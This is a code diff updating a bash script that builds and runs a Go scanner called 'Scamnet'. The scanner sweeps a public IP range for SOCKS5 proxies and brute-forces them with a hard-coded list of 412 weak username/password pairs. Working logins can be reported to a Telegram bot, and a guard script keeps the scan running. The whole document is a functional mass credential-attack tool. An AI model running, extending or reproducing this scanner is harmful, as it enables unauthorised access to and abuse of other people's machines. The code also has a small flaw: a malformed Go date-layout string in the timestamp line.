@@ -1,5 +1,5 @@
 #!/bin/bash
-# main.sh - Scamnet OTC v1.1（纯 Go 版 + 412 条弱口令 + 完全修复）
+# main.sh - Scamnet OTC v1.5（内存优化 + 边扫边生 + 412 弱口令）
 set -euo pipefail
 IFS=$'\n\t'
 
@@ -13,13 +13,11 @@ log() { echo -e "${BLUE}[$(date '+%H:%M:%S')]${NC} $*"; }
 err() { echo -e "${RED}[$(date '+%H:%M:%S')] [!] $*${NC}" >&2; }
 succ() { echo -e "${GREEN}[$(date '+%H:%M:%S')] [+] $*${NC}"; }
 
-# 检查 Go
 if ! command -v go >/dev/null 2>&1; then
     err "未找到 Go，请先安装: apt install golang-go -y"
     exit 1
 fi
 
-# 输入
 DEFAULT_START="157.254.32.0"
 DEFAULT_END="157.254.52.255"
 read_ip() { echo -e "${YELLOW}$1（默认: $2）:${NC}"; read -r input; eval "$3=\"\${input:-$2}\""; }
@@ -36,15 +34,14 @@ succ "范围: $START_IP - $END_IP"
 
 echo -e "${YELLOW}端口（默认: 1080）:${NC}"
 read -r PORT_INPUT; PORT_INPUT=${PORT_INPUT:-1080}
-PORTS="$PORT_INPUT"
+PORTS=$(echo "$PORT_INPUT" | tr ',' ' ')
 succ "端口: $PORT_INPUT"
 
 echo -e "${YELLOW}Telegram Bot Token（可选）:${NC}"; read -r TELEGRAM_TOKEN
 echo -e "${YELLOW}Telegram Chat ID（可选）:${NC}"; read -r TELEGRAM_CHATID
 [[ -n $TELEGRAM_TOKEN && -n $TELEGRAM_CHATID ]] && succ "Telegram 启用" || { TELEGRAM_TOKEN=""; TELEGRAM_CHATID=""; log "Telegram 禁用"; }
 
-# 编译 Go 程序（已删除 "io"）
-log "正在编译 Go 扫描器（412 条弱口令）..."
+log "正在编译 Go 扫描器（412 条弱口令 + 内存优化）..."
 cat > scamnet.go << 'EOF'
 package main
 
@@ -79,7 +76,6 @@ type Config struct {
 	BatchSize     int
 	MaxConcurrent int
 	Timeout       int
-	Retry         int
 }
 
 var (
@@ -95,7 +91,6 @@ type IPInfo struct {
 	Origin string `json:"origin"`
 }
 
-// === 412 条弱口令字典（已去重）===
 var weakPairs = [][2]string{
 	{"", ""}, {"0", "0"}, {"00", "00"}, {"000", "000"}, {"0000", "0000"}, {"00000", "00000"}, {"000000", "000000"},
 	{"1", "1"}, {"11", "11"}, {"111", "111"}, {"1111", "1111"}, {"11111", "11111"}, {"111111", "111111"},
@@ -162,7 +157,6 @@ func main() {
 	flag.IntVar(&cfg.BatchSize, "batch", 250, "Batch size")
 	flag.IntVar(&cfg.MaxConcurrent, "conc", 150, "Max concurrent")
 	flag.IntVar(&cfg.Timeout, "timeout", 6, "Timeout seconds")
-	flag.IntVar(&cfg.Retry, "retry", 2, "Retry times")
 	flag.Parse()
 
 	if cfg.StartIP == "" || cfg.EndIP == "" {
@@ -170,51 +164,37 @@ func main() {
 		os.Exit(1)
 	}
 
-	tasks := generateTasks()
-	total := len(tasks)
-	batchCount := (total + cfg.BatchSize - 1) / cfg.BatchSize
+	start := ipToInt(cfg.StartIP)
+	end := ipToInt(cfg.EndIP)
+	ports := parsePorts(cfg.Ports)
+	total := (end - start + 1) * uint32(len(ports))
+	batchCount := (total + uint64(cfg.BatchSize) - 1) / uint64(cfg.BatchSize)
 
 	fmt.Printf("[*] 总任务: %d | 每批: %d | 批次: %d\n", total, cfg.BatchSize, batchCount)
 
 	f, _ := os.OpenFile(validFile, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
-	f.WriteString("# Scamnet Go v7.4 - " + time.Now().Format("2006-01-02 15:04:05") + "\n")
+	f.WriteString("# Scamnet Go v1.5 - " + time.Now().Format("2025-01-02 15:04:05") + "\n")
 	f.Close()
 
-	for i := 0; i < total; i += cfg.BatchSize {
-		end := i + cfg.BatchSize
-		if end > total {
-			end = total
+	// 边生成边扫描
+	for batchStart := uint64(0); batchStart < total; batchStart += uint64(cfg.BatchSize) {
+		batchEnd := batchStart + uint64(cfg.BatchSize)
+		if batchEnd > total {
+			batchEnd = total
 		}
-		batch := tasks[i:end]
-		fmt.Printf("[*] 批次 %d → %d (%d tasks)\n", i, end, len(batch))
-		scanBatch(batch)
+		scanBatchByIndex(start, end, ports, batchStart, batchEnd)
 	}
 
 	dedupAndReport()
 }
 
-func generateTasks() []string {
-	start := ipToInt(cfg.StartIP)
-	end := ipToInt(cfg.EndIP)
-	ports := parsePorts(cfg.Ports)
-
-	var tasks []string
-	for ip := start; ip <= end; ip++ {
-		s := intToIP(ip)
-		for _, p := range ports {
-			tasks = append(tasks, fmt.Sprintf("%s:%d", s, p))
-		}
-	}
-	return tasks
-}
-
-func scanBatch(batch []string) {
+func scanBatchByIndex(startIP, endIP uint32, ports []int, batchStart, batchEnd uint64) {
 	sem := semaphore.NewWeighted(int64(cfg.MaxConcurrent))
 	ctx := context.Background()
 	var wg sync.WaitGroup
 
 	progress := int32(0)
-	total := int32(len(batch))
+	total := int32(batchEnd - batchStart)
 	go func() {
 		for {
 			p := atomic.LoadInt32(&progress)
@@ -235,18 +215,28 @@ func scanBatch(batch []string) {
 		}
 	}()
 
-	for _, target := range batch {
-		wg.Add(1)
-		go func(t string) {
-			defer wg.Done()
-			if err := sem.Acquire(ctx, 1); err != nil {
-				return
+	taskIdx := batchStart
+	for ip := startIP; ip <= endIP && taskIdx < batchEnd; ip++ {
+		s := intToIP(ip)
+		for _, p := range ports {
+			if taskIdx >= batchEnd {
+				goto done
 			}
-			defer sem.Release(1)
-			scanTarget(t)
-			atomic.AddInt32(&progress, 1)
-		}(target)
+			target := fmt.Sprintf("%s:%d", s, p)
+			wg.Add(1)
+			go func(t string) {
+				defer wg.Done()
+				if err := sem.Acquire(ctx, 1); err != nil {
+					return
+				}
+				defer sem.Release(1)
+				scanTarget(t)
+				atomic.AddInt32(&progress, 1)
+			}(target)
+			taskIdx++
+		}
 	}
+done:
 	wg.Wait()
 }
 
@@ -260,13 +250,11 @@ func scanTarget(target string) {
 	ip := parts[0]
 	port, _ := strconv.Atoi(parts[1])
 
-	// 无认证
 	if ok, lat, origin := testSocks5(ip, port, "", ""); ok && lat < 500 {
 		saveAndNotify(ip, port, "", "", origin, lat)
 		return
 	}
 
-	// 弱口令
 	for _, p := range weakPairs {
 		if ok, lat, origin := testSocks5(ip, port, p[0], p[1]); ok && lat < 500 {
 			saveAndNotify(ip, port, p[0], p[1], origin, lat)
@@ -392,7 +380,7 @@ func dedupAndReport() {
 	sort.Strings(sorted)
 
 	out, _ := os.Create(validFile + ".tmp")
-	out.WriteString("# Scamnet Go v1.1 - " + time.Now().Format("2025-01-01 15:04:05") + "\n")
+	out.WriteString("# Scamnet Go v1.5 - " + time.Now().Format("2025-01-02 15:04:05") + "\n")
 	for _, l := range sorted {
 		out.WriteString(l + "\n")
 	}
@@ -420,36 +408,29 @@ func intToIP(n uint32) string {
 }
 
 func parsePorts(s string) []int {
-	if strings.Contains(s, "-") {
-		parts := strings.Split(s, "-")
-		start, _ := strconv.Atoi(parts[0])
-		end, _ := strconv.Atoi(parts[1])
-		var ports []int
-		for i := start; i <= end; i++ {
+	var ports []int
+	for _, p := range strings.Fields(s) {
+		if strings.Contains(p, "-") {
+			parts := strings.Split(p, "-")
+			start, _ := strconv.Atoi(parts[0])
+			end, _ := strconv.Atoi(parts[1])
+			for i := start; i <= end; i++ {
+				ports = append(ports, i)
+			}
+		} else {
+			i, _ := strconv.Atoi(p)
 			ports = append(ports, i)
 		}
-		return ports
 	}
-	if strings.Contains(s, ",") {
-		var ports []int
-		for _, p := range strings.Split(s, ",") {
-			i, _ := strconv.Atoi(strings.TrimSpace(p))
-			ports = append(ports, i)
-		}
-		return ports
-	}
-	p, _ := strconv.Atoi(s)
-	return []int{p}
+	return ports
 }
 EOF
 
-# 编译
 go mod init scamnet 2>/dev/null || true
 go get golang.org/x/sync/semaphore 2>/dev/null || true
 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o "$GO_BIN" scamnet.go
 succ "Go 扫描器编译完成 → $GO_BIN"
 
-# 守护进程
 GUARD_SCRIPT="$LOG_DIR/scamnet_guard.sh"
 cat > "$GUARD_SCRIPT" << EOF
 #!/bin/bash
@@ -464,7 +445,6 @@ while :; do
         -batch 250 \\
         -conc 150 \\
         -timeout 6 \\
-        -retry 2 \\
         2>&1 | tee -a "$LATEST_LOG"
     echo "[GUARD] 重启中..."
     sleep 3
